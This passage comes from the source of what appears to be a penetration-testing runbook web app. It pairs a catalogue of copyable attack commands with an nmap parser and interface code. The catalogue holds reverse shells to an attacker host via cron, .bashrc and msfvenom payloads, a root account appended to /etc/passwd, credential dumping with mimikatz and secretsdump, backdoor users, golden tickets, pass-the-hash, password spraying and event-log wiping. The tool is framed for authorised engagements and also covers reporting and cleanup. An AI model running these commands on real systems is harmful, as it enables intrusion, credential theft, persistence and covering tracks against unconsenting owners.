              "echo 'chmod +s /bin/bash' >> /etc/cron_script.sh",
              "# PATH hijack:",
              "export PATH=/tmp:$PATH && echo '/bin/bash' > /tmp/legitimate_cmd && chmod +x /tmp/legitimate_cmd",
              "# Writable /etc/passwd:",
              "echo 'pwned:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd",
              "# Kernel exploits — check version:",
              "uname -a && searchsploit linux kernel $(uname -r | cut -d- -f1)",
              "# DirtyPipe (5.8 ≤ kernel ≤ 5.16.11):",
              "./dirtypipe /etc/passwd",
            ]
          },
          { id: "win_privesc", label: "Windows PrivEsc Techniques", tags: ["windows","privesc","admin"],
            platformHint: "windows",
            description: "Token abuse is the fastest path if you have SeImpersonatePrivilege (most service accounts do). Unquoted paths and weak service ACLs are classic enterprise misconfigs.",
            commands: [
              "# Token abuse — SeImpersonatePrivilege:",
              "whoami /priv | findstr Impersonate",
              "PrintSpoofer.exe -i -c cmd",
              "GodPotato.exe -cmd 'cmd /c whoami > C:\\out.txt'",
              ".\\JuicyPotatoNG.exe -t * -p 'C:\\Windows\\System32\\cmd.exe' -a '/c net user hacker P@ss123 /add'",
              "# Unquoted service path — list PathName values; risky rows contain spaces but no wrapping quotes:",
              "wmic service get name,pathname,startmode",
              "# Plant exe at early resolved segment then restart that service (adjust names):",
              "copy shell.exe C:\\Program.exe && net stop SomeSvc && net start SomeSvc",
              "# AlwaysInstallElevated — MSI payload:",
              "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4445 -f msi -o evil.msi",
              ".\\evil.msi  # runs as SYSTEM",
              "# DLL hijacking — find missing DLLs with ProcMon",
              "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4445 -f dll -o missing.dll",
            ]
          },
          { id: "cred_harvest", label: "Credential Harvesting", tags:["credentials","loot"],
            description: "Credentials are the gift that keeps giving — they unlock lateral movement. Check every config file, env variable, history file, and credential manager.",
            commands: [
              "# Linux — find creds in config files:",
              "grep -rn 'password\\|passwd\\|secret\\|api_key\\|token' /var/www /opt /home 2>/dev/null | grep -v '.git'",
              "find / -name '*.conf' -o -name '*.env' -o -name '*.cfg' 2>/dev/null | xargs grep -l pass",
              "cat ~/.ssh/id_rsa 2>/dev/null",
              "cat /etc/shadow  # if root",
              "# Windows — SAM dump:",
              "secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL",
              "# Windows — LSASS (requires admin):",
              "pypykatz lsa minidump lsass.dmp",
              "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
              "# Windows — credential manager:",
              "cmdkey /list",
              "# Both — env vars:",
              "env | grep -i 'pass\\|key\\|secret\\|token'",
            ]
          },
        ]
      },
      {
        id: "persistence", label: "Persistence Mechanisms", icon: "◉",
        difficulty: "advanced",
        tip: "In a real engagement, document every persistence mechanism — you'll need to report and remove them all.",
        techniques: [
          { id: "linux_persist", label: "Linux Persistence", tags: ["linux","persistence"],
            platformHint: "linux",
            description: "Backdoors should be subtle. SSH keys are the most reliable — they survive reboots and don't rely on network listeners. Cron and .bashrc are noisy but fast.",
            commands: [
              "# SSH key backdoor (most reliable):",
              "mkdir -p ~/.ssh && echo '$ATTACKER_PUBKEY' >> ~/.ssh/authorized_keys",
              "chmod 600 ~/.ssh/authorized_keys",
              "# Cron reverse shell:",
              "(crontab -l 2>/dev/null; echo '*/5 * * * * bash -i >& /dev/tcp/$ATTACKER/4444 0>&1') | crontab -",
              "# SUID bash (root required):",
              "cp /bin/bash /tmp/.hidden_bash && chmod +s /tmp/.hidden_bash",
              "/tmp/.hidden_bash -p  # to use: gives root shell",
              "# .bashrc hook:",
              "echo 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1' >> ~/.bashrc",
            ]
          },
          { id: "win_persist", label: "Windows Persistence", tags: ["windows","persistence"],
            platformHint: "windows",
            description: "Registry run keys and scheduled tasks are detectable but reliable. For stealth, service installation is better. Always note the modification time of any file you change.",
            commands: [
              "# Registry run key:",
              "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d 'C:\\Windows\\Temp\\shell.exe'",
              "# Scheduled task:",
              "schtasks /create /tn 'WindowsUpdate' /tr 'C:\\Windows\\Temp\\shell.exe' /sc onlogon /ru System",
              "# New admin user:",
              "net user backdoor P@ssw0rd123! /add && net localgroup administrators backdoor /add",
              "# Golden ticket (AD — requires krbtgt hash):",
              "ticketer.py -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator",
              "export KRB5CCNAME=Administrator.ccache && psexec.py -k -no-pass $DOMAIN/Administrator@$TARGET",
            ]
          },
        ]
      },
    ]
  },

  {
    id: "lateral", label: "LATERAL MOVEMENT", shortLabel: "LATERAL",
    num: "05", color: "#22c55e", icon: "◎",
    tagline: "One machine is a foothold. The network is the target.",
    description: "Use credentials, tokens, and trust relationships to expand your reach. Every new system is a new opportunity for privilege escalation and credential harvesting. Map the network as you move.",
    sections: [
      {
        id: "pivot", label: "Network Pivoting", icon: "○",
        difficulty: "intermediate",
        tip: "Draw the network as you discover it. Obsidian or even pen and paper — you'll lose track otherwise.",
        techniques: [
          { id: "pivot_setup", label: "Tunnel & Proxy Setup", tags: ["pivot","network"],
            description: "Pivot through your foothold to reach internal network segments. Ligolo-ng is the modern standard — faster and more stable than proxychains+ssh tunnels.",
            commands: [
              "# Ligolo-ng (recommended):",
              "# Attacker — start proxy:",
              "./proxy -selfcert -laddr 0.0.0.0:11601",
              "# Target — upload and run agent:",
              "./agent -connect $ATTACKER:11601 -ignore-cert",
              "# In ligolo: session → start → add route: ip route add 10.10.10.0/24 dev ligolo",
              "# SSH tunnels:",
              "ssh -L 8080:internal_host:80 user@$TARGET  # local forward",
              "ssh -R 4444:$ATTACKER:4444 user@$TARGET    # remote forward",
              "ssh -D 1080 user@$TARGET                    # SOCKS5 proxy",
              "# proxychains config:",
              "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf",
              "proxychains nmap -sT -p 80,443,445 10.10.10.0/24",
            ]
          },
          { id: "internal_recon", label: "Internal Network Recon", tags: ["pivot","recon"],
            description: "Once pivoting is set up, repeat your recon phase on the internal network. Internal services are often far less hardened than perimeter-facing ones.",
            commands: [
              "# From compromised host:",
              "ip route && arp -a && cat /etc/hosts",
              "for i in $(seq 1 254); do ping -c1 -W1 10.10.10.$i &>/dev/null && echo '10.10.10.'$i; done",
              "# Through pivot:",
              "proxychains nmap -sT -T2 10.10.10.0/24",
              "proxychains crackmapexec smb 10.10.10.0/24",
              "# Upload nmap to target and scan locally:",
              "wget http://$ATTACKER/nmap_static -O /tmp/nmap && chmod +x /tmp/nmap",
              "/tmp/nmap -sT -p 22,80,443,445,3389,8080 10.10.10.0/24",
            ]
          },
        ]
      },
      {
        id: "cred_reuse", label: "Credential & Token Reuse", icon: "◆",
        difficulty: "intermediate",
        tip: "People reuse passwords everywhere. Spray carefully — account lockout is a real risk.",
        techniques: [
          { id: "pass_spray", label: "Password Spraying", tags: ["credentials","active-directory"],
            description: "One password, many users — avoids lockout. Wait the lockout threshold between rounds. Seasonal passwords (Spring2024!, Company@2024) are devastatingly common.",
            commands: [
              "# SMB spray:",
              "crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success",
              "# Kerberos spray (stealthier — fewer logs):",
              "kerbrute passwordspray -d $DOMAIN --dc $TARGET users.txt 'Password123!'",
              "# WinRM spray:",
              "crackmapexec winrm 10.10.10.0/24 -u users.txt -p passwords.txt",
              "# SSH spray:",
              "crackmapexec ssh 10.10.10.0/24 -u users.txt -p passwords.txt",
            ]
          },
          { id: "pth", label: "Pass-the-Hash / Pass-the-Ticket", tags: ["credentials","active-directory","windows"],
            platformHint: "windows",
            description: "NTLM hashes authenticate without cracking. Kerberos tickets grant access to services. Both techniques let you move laterally using captured material — no plaintext needed.",
            commands: [
              "# Pass-the-Hash (NTLM):",
              "crackmapexec smb $TARGET -u Administrator -H $NTLM_HASH",
              "psexec.py -hashes :$NTLM_HASH Administrator@$TARGET",
              "evil-winrm -i $TARGET -u Administrator -H $NTLM_HASH",
              "# Pass-the-Ticket (Kerberos):",
              "getTGT.py $DOMAIN/$USER:$PASS -dc-ip $TARGET",
              "ticketConverter.py leaked.kirbi out.ccache && export KRB5CCNAME=out.ccache",
              "rubeus.exe ptt /ticket:ticket.kirbi",
              "export KRB5CCNAME=admin.ccache && psexec.py -k -no-pass $DOMAIN/Administrator@$TARGET",
            ]
          },
          { id: "rdp_lateral", label: "RDP & WinRM Lateral Movement", tags: ["windows","rdp"],
            platformHint: "windows",
            description: "WinRM (5985/5986) is PowerShell remoting — quieter than psexec. RDP gives full GUI access. Both require valid credentials or hashes.",
            commands: [
              "# WinRM (port 5985):",
              "evil-winrm -i $TARGET -u $USER -p $PASS",
              "# RDP from Linux:",
              "xfreerdp /u:$USER /p:$PASS /v:$TARGET /dynamic-resolution",
              "rdesktop -u $USER -p $PASS $TARGET",
              "# Enable RDP remotely (if admin):",
              "crackmapexec smb $TARGET -u $USER -p $PASS -x \"reg add \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\"",
            ]
          },
        ]
      },
    ]
  },

  {
    id: "reporting", label: "REPORTING", shortLabel: "REPORT",
    num: "06", color: "#f59e0b", icon: "◈",
    tagline: "The exploit that isn't documented didn't happen.",
    description: "A technically perfect engagement with a poor report is a failed engagement. Your report is the deliverable — it must be clear, reproducible, and actionable for both technical and management audiences. SysReptor makes this structured and fast.",
    sections: [
      {
        id: "finding_structure", label: "Finding Documentation", icon: "○",
        difficulty: "beginner",
        tip: "Write findings during the engagement, not after. Memory fades and screenshots disappear.",
        techniques: [
          { id: "finding_template", label: "Finding Structure Template", tags: ["reporting","documentation"],
            description: "Every finding needs: title, severity, description, evidence, reproduction steps, and remediation. CVSS scoring should be calculated for every finding, not estimated.",
            commands: [
              "# Finding template (Markdown):",
              "# ## [CRITICAL] Unauthenticated RCE via CVE-2021-XXXXX",
              "# **CVSS:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
              "# **Affected:** $TARGET:$PORT ($SERVICE $VERSION)",
              "# **Description:** <what the vulnerability is and why it matters>",
              "# **Evidence:** <screenshot reference> <command output>",
              "# **Steps to Reproduce:**",
              "# 1. ...",
              "# **Remediation:** <specific, actionable fix>",
              "# **References:** CVE-XXXX-XXXXX, https://...",
            ]
          },
          { id: "cvss", label: "CVSS Scoring", tags: ["reporting","cvss"],
            description: "Use CVSS v3.1. Understand the metrics — don't just guess a number. NIST NVD calculator helps. Report both base score and severity label (Critical/High/Medium/Low).",
            commands: [
              "# CVSS v3.1 vector components:",
              "# AV: Attack Vector    (N=Network, A=Adjacent, L=Local, P=Physical)",
              "# AC: Attack Complexity (L=Low, H=High)",
              "# PR: Privileges Required (N=None, L=Low, H=High)",
              "# UI: User Interaction   (N=None, R=Required)",
              "# S:  Scope              (U=Unchanged, C=Changed)",
              "# C/I/A: Impact          (N=None, L=Low, H=High)",
              "# Example — Network RCE, no auth needed:",
              "# CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 CRITICAL",
              "# Calculator: https://www.first.org/cvss/calculator/3.1",
            ]
          },
        ]
      },
      {
        id: "sysreptor", label: "SysReptor Workflow", icon: "◉",
        difficulty: "intermediate",
        tip: "Set up your SysReptor templates before the engagement, not during it.",
        techniques: [
          { id: "sysreptor_setup", label: "SysReptor Setup & API", tags: ["sysreptor","reporting"],
            description: "SysReptor is the reporting platform that your htb_reporter tool targets. Structure your notes in Notion with the right fields, then let the pipeline populate findings automatically.",
            commands: [
              "# SysReptor local instance:",
              "cd sysreptor && docker-compose up -d",
              "# API authentication:",
              "curl -X POST https://$SYSREPTOR/api/v1/auth/login/ -d '{\"username\":\"$USER\",\"password\":\"$PASS\"}'",
              "# Create report via API:",
              "curl -X POST https://$SYSREPTOR/api/v1/pentestprojects/ -H 'Authorization: Bearer $TOKEN' -d '{\"name\":\"$TARGET Engagement\"}'",
              "# Your htb_reporter pipeline:",
              "python3 htb_reporter.py --target $TARGET --notion-page $PAGE_ID --output sysreptor",
            ]
          },
          { id: "evidence", label: "Evidence Collection", tags: ["reporting","evidence"],
            description: "Screenshots, command output, and network captures. Name everything systematically — you'll have hundreds of files by the end. Timestamped logs prevent 'when did we find this' arguments.",
            commands: [
              "# Screenshot tool:",
              "flameshot gui  # Linux",
              "# Terminal logging — log everything:",
              "script -a ~/engagement/logs/session_$(date +%Y%m%d_%H%M%S).log",
              "# Or in tmux — enable logging in .tmux.conf:",
              "# set -g @plugin 'tmux-plugins/tmux-logging'",
              "# Capture specific command output:",
              "command_here 2>&1 | tee ~/engagement/evidence/finding_01_$(date +%s).txt",
              "# Network capture during exploitation:",
              "tcpdump -i eth0 -w ~/engagement/pcaps/exploit_$(date +%s).pcap",
            ]
          },
        ]
      },
    ]
  },

  {
    id: "cleanup", label: "TRACK CLEARING", shortLabel: "CLEANUP",
    num: "07", color: "#64748b", icon: "○",
    tagline: "Leave no trace. Restore what you touched.",
    description: "A professional engagement removes all artefacts, backdoors, and indicators of compromise. This protects the client from real attackers leveraging your access, and demonstrates professionalism. Document everything you remove.",
    sections: [
      {
        id: "artefact_removal", label: "Artefact Removal", icon: "○",
        difficulty: "intermediate",
        tip: "Keep a running list of every file you create, every service you modify, every user you add. Cleanup is only complete when that list is empty.",
        techniques: [
          { id: "file_cleanup", label: "File & Tool Removal", tags: ["cleanup","artefacts"],
            description: "Every binary, script, and webshell you uploaded needs to come back off. Check /tmp, /var/tmp, web directories, and anywhere else you dropped files.",
            commands: [
              "# Remove uploaded tools:",
              "rm -f /tmp/linpeas.sh /tmp/pspy /tmp/chisel /tmp/nmap_static",
              "rm -f /var/www/html/shell.php /var/www/html/.webshell*",
              "# Find recently modified files (your timeframe):",
              "find / -newer /tmp/reference_file -type f 2>/dev/null | grep -v proc",
              "find / -mtime -1 -type f 2>/dev/null  # modified in last 24h",
              "# Windows cleanup:",
              "del C:\\Windows\\Temp\\winpeas.exe",
              "del C:\\Windows\\Temp\\shell.exe",
              "Get-ChildItem -Path C:\\Windows\\Temp\\ | Remove-Item -Force",
            ]
          },
          { id: "persistence_removal", label: "Backdoor & Persistence Removal", tags: ["cleanup","persistence"],
            description: "Every persistence mechanism must be removed. Cross-reference your notes — if you added a cron job, a registry key, a user account, or an SSH key, it must be removed.",
            commands: [
              "# Remove cron jobs:",
              "crontab -l  # verify what's there",
              "crontab -r  # or crontab -e to remove specific lines",
              "# Remove SSH keys:",
              "# Edit ~/.ssh/authorized_keys and remove your public key",
              "# Remove created users (Linux):",
              "userdel -r backdoor_user",
              "# Remove created users (Windows):",
              "net user backdoor_user /delete",
              "# Remove registry run keys:",
              "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /f",
              "# Remove scheduled tasks:",
              "schtasks /delete /tn 'WindowsUpdate' /f",
              "# Restore SUID binaries:",
              "chmod -s /tmp/.hidden_bash && rm /tmp/.hidden_bash",
            ]
          },
          { id: "log_clearing", label: "Log Management", tags: ["cleanup","logs"],
            description: "Selective log clearing is preferable to wiping entire log files — total log wipes are themselves an IoC. Remove your specific entries where possible, or note what you couldn't clean.",
            commands: [
              "# Linux — auth log (SSH entries):",
              "# Edit /var/log/auth.log — remove your IP/session lines",
              "# Bash history — clear yours:",
              "history -c && history -w",
              "echo '' > ~/.bash_history",
              "# Apache/nginx access logs — remove your IP:",
              "sed -i '/$ATTACKER_IP/d' /var/log/apache2/access.log",
              "sed -i '/$ATTACKER_IP/d' /var/log/nginx/access.log",
              "# Windows event logs (requires admin):",
              "wevtutil cl Security",
              "wevtutil cl System",
              "wevtutil cl Application",
              "# PowerShell history:",
              "Remove-Item (Get-PSReadlineOption).HistorySavePath",
              "Clear-History",
              "# Note: in real engagements, discuss log handling with client beforehand",
            ]
          },
        ]
      },
      {
        id: "handover", label: "Engagement Handover", icon: "◈",
        difficulty: "beginner",
        tip: "The cleanup checklist should be signed off by you and the client together where possible.",
        techniques: [
          { id: "checklist", label: "Final Checklist", tags: ["cleanup","handover"],
            description: "Structured sign-off before the engagement is considered complete. Walk through every system you accessed.",
            commands: [
              "# ✓ All uploaded files removed",
              "# ✓ All created user accounts removed",
              "# ✓ All persistence mechanisms removed (cron, reg keys, services, SSH keys)",
              "# ✓ All backdoors and webshells removed",
              "# ✓ Modified configs restored to original",
              "# ✓ Log entries cleaned or noted as uncleaned",
              "# ✓ All tunnels and listeners terminated",
              "# ✓ Report drafted with all findings",
              "# ✓ Evidence archive securely stored",
              "# ✓ Client walkthrough scheduled",
            ]
          },
        ]
      },
    ]
  },
];

// ═══════════════════════════════════════════════════════════════
// NMAP XML PARSER
// ═══════════════════════════════════════════════════════════════
const parseNmapXml = (xmlText) => {
  const parser = new DOMParser();
  const doc = parser.parseFromString(xmlText, "text/xml");
  const results = [];
  doc.querySelectorAll("host").forEach(host => {
    const addrEl = host.querySelector("address[addrtype='ipv4'], address[addrtype='ipv6']");
    const ip = addrEl?.getAttribute("addr") || "unknown";
    const hostname = host.querySelector("hostname")?.getAttribute("name") || null;
    const ports = [];
    host.querySelectorAll("port").forEach(portEl => {
      if (portEl.querySelector("state")?.getAttribute("state") !== "open") return;
      const portId = parseInt(portEl.getAttribute("portid"), 10);
      const protocol = portEl.getAttribute("protocol");
      const serviceEl = portEl.querySelector("service");
      const scripts = [];
      portEl.querySelectorAll("script").forEach(s => scripts.push({ id: s.getAttribute("id"), output: s.getAttribute("output") }));
      ports.push({ portId, protocol, service: serviceEl?.getAttribute("name")||"", product: serviceEl?.getAttribute("product")||"", version: serviceEl?.getAttribute("version")||"", scripts });
    });
    const osMatches = [];
    host.querySelectorAll("osmatch").forEach(o => osMatches.push({ name: o.getAttribute("name"), accuracy: o.getAttribute("accuracy") }));
    if (ports.length > 0 || results.length === 0) results.push({ ip, hostname, ports, osMatches });
  });
  return results;
};

const getTriggeredSections = (openPorts) => {
  const triggers = new Set();
  openPorts.forEach(p => (PORT_MAP[p]||[]).forEach(id => triggers.add(id)));
  return triggers;
};

const getTechniqueMatchedPorts = (tech, openPorts) => {
  if (!tech?.tags?.length || !openPorts?.length) return [];
  const tags = new Set(tech.tags.map((tag) => String(tag).toLowerCase()));
  const matches = [];
  openPorts.forEach((port) => {
    const mapped = PORT_MAP[port] || [];
    if (mapped.some((serviceId) => tags.has(serviceId))) matches.push(port);
  });
  return [...new Set(matches)].sort((a, b) => a - b);
};

/** Technique or section: windows | linux | mixed (both exploit families in one card). */
const resolvePlatformHint = (tech, section) =>
  tech.platformHint ?? section.platformHint ?? null;

/**
 * Guess host OS from nmap osmatch (+ service fingerprint if guess is weak).
 * "linux" buckets Unix-like targets (BSD, macOS server, etc.) for runbook hints.
 */
const inferTargetOs = (scanData) => {
  const unknown = { family: "unknown", label: "OS unknown — run nmap -O or -A", confidence: "none", bestAccuracy: 0, rawName: "" };
  if (!scanData?.length) return unknown;
  const host = scanData[0];
  let bestName = "";
  let bestAcc = -1;
  (host.osMatches || []).forEach((m) => {
    const a = parseInt(m.accuracy, 10) || 0;
    if (a > bestAcc) {
      bestAcc = a;
      bestName = m.name || "";
    }
  });
  const s = bestName.toLowerCase();
  const winRe = /\bwindows|microsoft|win\d{2,4}\b|winserv|embedded|powershell|exchange|iis\b|terminal services|remote desktop|httpapi|microsoft ftp|microsoft dns/i;
  const linRe = /\blinux\b|ubuntu|debian|centos|rhel\b|fedora|red hat|oracle linux|\bsuse\b|opensuse|gentoo|amazon linux|slackware|routeros|unix(?!\s+microsoft)|\bbusybox\b|freebsd|openbsd|netbsd|darwin|mac os|osx\b|solaris|illumos|\baix\b|hp-ux/i;

  let family = "unknown";
  if (s) {
    const w = winRe.test(s);
    const l = linRe.test(s);
    if (w && !l) family = "windows";
    else if (l && !w) family = "linux";
  }

  if (family === "unknown" || bestAcc < 85) {
    let wScore = 0;
    let lScore = 0;
    for (const p of host.ports || []) {
      const blob = `${p.service} ${p.product} ${p.version}`.toLowerCase();
      if (/microsoft|iis\b|ms-wbt-server|remote desktop protocol|rdp|winrm|endpoint mapper|ms-sql|sql server|httpapi/i.test(blob)) wScore += 2;
      if (/\bsamba\b|ubuntu|debian|centos|rhel|fedora|\blinux\b|\bopenssh\b|nginx\/|nfs|mountd|postgres/i.test(blob)) lScore += 2;
    }
    if (wScore > lScore && wScore > 0) family = "windows";
    else if (lScore > wScore && lScore > 0) family = "linux";
  }

  const label = family === "windows" ? "Windows" : family === "linux" ? "Linux / Unix-like" : unknown.label;
  let confidence = "none";
  if (bestAcc >= 85 && family !== "unknown") confidence = "os-scan-strong";
  else if (bestAcc > 0 && family !== "unknown") confidence = "os-scan";
  else if (family !== "unknown") confidence = "services";

  return {
    family,
    label,
    confidence,
    bestAccuracy: bestAcc,
    rawName: bestName,
  };
};

/** @returns {"match"|"mismatch"|"unknown"|"neutral"} */
const getPlatformFit = (hint, targetOs) => {
  if (!hint || hint === "mixed") return "neutral";
  if (targetOs.family === "unknown") return "unknown";
  return hint === targetOs.family ? "match" : "mismatch";
};

// ═══════════════════════════════════════════════════════════════
// COMPONENTS
// ═══════════════════════════════════════════════════════════════
function CopyBtn({ text, label="COPY" }) {
  const [done, setDone] = useState(false);
  return (
    <button onClick={e => { e.stopPropagation(); navigator.clipboard.writeText(text); setDone(true); setTimeout(()=>setDone(false),1500); }}
      style={{ background:"none", border:`1px solid ${done?"#22c55e33":"#1e2530"}`, borderRadius:3, padding:"1px 7px", color:done?"#22c55e":"#3a4a5a", fontSize:9, cursor:"pointer", fontFamily:"inherit", transition:"all 0.15s", letterSpacing:"0.05em" }}>
      {done?"✓ COPIED":label}
    </button>
  );
}

function DifficultyBadge({ level }) {
  const map = { beginner:["#22c55e","BEGINNER"], intermediate:["#f59e0b","INTERMEDIATE"], advanced:["#ff3366","ADVANCED"] };
  const [color, text] = map[level] || ["#64748b","UNKNOWN"];
  return <span style={{ fontSize:8, color, background:color+"18", padding:"2px 7px", borderRadius:3, letterSpacing:"0.12em", border:`1px solid ${color}30` }}>{text}</span>;
}

function SeverityBadge({ sev }) {
  if (!sev) return null;
  const map = { critical:["#ff0055","CRITICAL"], high:["#ff3366","HIGH"], medium:["#f59e0b","MEDIUM"], low:["#22c55e","LOW"], varies:["#64748b","VARIES"] };
  const [color, text] = map[sev] || ["#64748b", sev.toUpperCase()];
  return <span style={{ fontSize:8, color, background:color+"18", padding:"2px 7px", borderRadius:3, letterSpacing:"0.1em", border:`1px solid ${color}30` }}>{text}</span>;
}

function PlatformFitBadge({ hint, targetOs }) {
  const fit = getPlatformFit(hint, targetOs);
  if (!hint) return null;
  const pill = { fontSize: 7, letterSpacing: "0.1em", padding: "2px 7px", borderRadius: 3, fontWeight: 700 };

  if (hint === "mixed") {
    return (
      <span style={{ ...pill, color: "#94a3b8", border: "1px solid #33415550", background: "#0f182818" }}>
        WIN + LINUX
      </span>
    );
  }
  if (fit === "neutral") return null;
  if (fit === "unknown") {
    return (
      <span style={{ ...pill, color: "#64748b", border: "1px solid #33415566", background: "#1e293b12", fontWeight: 600 }}>
        {hint === "windows" ? "WINDOWS" : "LINUX"} · VERIFY OS
      </span>
    );
  }
  if (fit === "match") {
    const c = hint === "windows" ? "#38bdf8" : "#4ade80";
    return (
      <span style={{ ...pill, color: c, border: `1px solid ${c}55`, background: c + "14" }}>
        {hint === "windows" ? "WINDOWS FIT" : "LINUX FIT"}
      </span>
    );
  }
  return (
    <span style={{ ...pill, color: "#a8a29e", border: "1px solid #44403c55", background: "#1c191712" }}>
      {hint === "windows" ? "WINDOWS SCRIPTS" : "LINUX SCRIPTS"} · LOW VS GUESS
    </span>
  );
}

function TechniqueCard({ tech, section, phaseId, phaseColor, scanData, scanTriggers, openPorts, targetOs, checkedCmds, cmdNotes, toggleCmdCheck, setCmdNote }) {
  const [open, setOpen] = useState(false);
  const enriched = tech.commands.map(cmd => scanData?.[0] ? cmd.replace(/\$TARGET/g, scanData[0].ip) : cmd);
  const hint = resolvePlatformHint(tech, section);
  const fit = getPlatformFit(hint, targetOs ?? { family: "unknown" });
  const matchedPorts = getTechniqueMatchedPorts(tech, openPorts);

  let trackDone = 0;
  let trackTotal = 0;
  for (let j = 0; j < enriched.length; j++) {
    if (enriched[j].trim().startsWith("#")) continue;
    trackTotal++;
    if (checkedCmds.has(cmdCheckKey(phaseId, section.id, tech.id, j))) trackDone++;
  }

  let leftBar = "#0f1820";
  if (scanData && hint && hint !== "mixed") {
    if (fit === "match") leftBar = targetOs.family === "windows" ? "#38bdf8" : "#4ade80";
    else if (fit === "mismatch") leftBar = "#3f3f46";
    else leftBar = "#27272a";
  }
  if (matchedPorts.length) leftBar = phaseColor;

  return (
    <div style={{ border:"1px solid "+(open ? phaseColor+"44" : "#0f1820"), borderLeft:`3px solid ${leftBar}`, borderRadius:8, overflow:"hidden", transition:"all 0.2s", background: open ? phaseColor+"06" : "#080b0f", opacity: scanData && fit === "mismatch" ? 0.92 : 1 }}>
      <div onClick={()=>setOpen(o=>!o)} style={{ padding:"13px 16px", cursor:"pointer", display:"flex", alignItems:"center", gap:10 }}>
        <span style={{ color: open ? phaseColor : "#2a3848", fontSize:12, transition:"color 0.2s" }}>{open?"▼":"▶"}</span>
        <div style={{ flex:1 }}>
          <div style={{ display:"flex", alignItems:"center", gap:8, flexWrap:"wrap" }}>
            <span style={{ color: open ? phaseColor : "#4a6a7a", fontSize:12, fontWeight:700, letterSpacing:"0.06em" }}>{tech.label}</span>
            {tech.severity && <SeverityBadge sev={tech.severity} />}
            {scanData && <PlatformFitBadge hint={hint} targetOs={targetOs} />}
            {tech.tags?.map(t => <span key={t} style={{ fontSize:8, color:phaseColor+"cc", background:phaseColor+"16", border:`1px solid ${phaseColor}4a`, padding:"1px 6px", borderRadius:3, letterSpacing:"0.08em" }}>{t}</span>)}
            {matchedPorts.length > 0 && (
              <span style={{ fontSize:8, color:"#8de8ff", background:"#072434", border:"1px solid #1d5976", padding:"1px 6px", borderRadius:3, letterSpacing:"0.08em" }} title="Ports from uploaded scan mapped to this technique">
                PORTS: {matchedPorts.join(", ")}
              </span>
            )}
            {trackTotal > 0 && (
              <span style={{ fontSize:8, color: trackDone === trackTotal ? phaseColor + "aa" : "#6b8496", letterSpacing:"0.06em" }} title="Command steps done in this technique">
                {trackDone}/{trackTotal}
              </span>
            )}
          </div>
        </div>
        <div style={{ display:"flex", alignItems:"center", gap:8, marginLeft:"auto", flexShrink:0 }}>
          {open && <CopyBtn text={enriched.join("\n")} label="COPY ALL" />}
        </div>
      </div>

      {open && (
        <div style={{ borderTop:`1px solid ${phaseColor}22` }}>
          <div style={{ padding:"12px 16px 0", color:"#4a6070", fontSize:11, lineHeight:1.75 }}>
            {tech.description}
          </div>
          <div style={{ margin:"12px 8px 8px", background:"#050810", border:"1px solid #0c1520", borderRadius:6, overflow:"hidden" }}>
            {enriched.map((cmd, i) => {
              const isComment = cmd.trim().startsWith("#");
              const chkKey = cmdCheckKey(phaseId, section.id, tech.id, i);
              const isDone = !isComment && checkedCmds.has(chkKey);
              return (
                <div key={i} style={{ display:"flex", flexDirection:"column", gap:6, padding:"7px 14px", borderBottom: i < enriched.length-1 ? "1px solid #0a0f18":"none", background: isDone ? phaseColor + "12" : "transparent", boxShadow: isDone ? `inset 2px 0 0 ${phaseColor}55` : "none", opacity: isDone ? 0.86 : 1, transition:"background 0.18s, box-shadow 0.18s, opacity 0.18s" }}>
                  <div style={{ display:"flex", alignItems:"flex-start", gap:8 }}>
                  {!isComment ? (
                    <input
                      type="checkbox"
                      className="cmd-check"
                      checked={isDone}
                      title="Mark step done"
                      onChange={(e) => {
                        e.stopPropagation();
                        toggleCmdCheck(chkKey);
                      }}
                      onClick={(e) => e.stopPropagation()}
                      style={{ "--cmd-accent": phaseColor }}
                    />
                  ) : (
                    <span style={{ width:14, minWidth:14, flexShrink:0 }} aria-hidden />
                  )}
                  {!isComment && <span style={{ color:phaseColor+"44", fontSize:10, userSelect:"none", paddingTop:2, minWidth:12 }}>$</span>}
                  {isComment && <span style={{ color:"#1e3040", fontSize:10, userSelect:"none", paddingTop:2, minWidth:12 }}>#</span>}
                  <span style={{ color: isComment ? "#1e3545" : "#7090a8", fontSize:11, lineHeight:1.6, wordBreak:"break-all", flex:1, fontStyle: isComment?"italic":"normal" }}>
                    {isComment ? cmd.trim().substring(2) : cmd}
                  </span>
                  {!isComment && <CopyBtn text={cmd} />}
                  </div>
                  {!isComment && isDone && (
                    <div style={{ marginLeft:22 }}>
                      <textarea
                        value={cmdNotes[chkKey] || ""}
                        onChange={(e) => setCmdNote(chkKey, e.target.value)}
                        placeholder="Add output/notes for this step..."
                        style={{
                          width:"100%",
                          minHeight:54,
                          background:"#060d14",
                          color:"#93b3c8",
                          border:`1px solid ${phaseColor}33`,
                          borderRadius:5,
                          padding:"7px 8px",
                          fontFamily:"inherit",
                          fontSize:10,
                          lineHeight:1.55,
                          resize:"vertical",
                        }}
                      />
                    </div>
                  )}
                </div>
              );
            })}
          </div>
          {tech.resources && (
            <div style={{ padding:"0 16px 12px", display:"flex", gap:8, flexWrap:"wrap" }}>
              {tech.resources.map((r,i) => <a key={i} href={r} target="_blank" rel="noopener" style={{ color:"#1e4060", fontSize:9, letterSpacing:"0.05em", textDecoration:"none" }}>↗ {r.replace(/https?:\/\//,"")}</a>)}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

function PhaseSection({ section, phaseId, phaseColor, scanData, scanTriggers, openPorts, targetOs, checkedCmds, cmdNotes, toggleCmdCheck, setCmdNote }) {
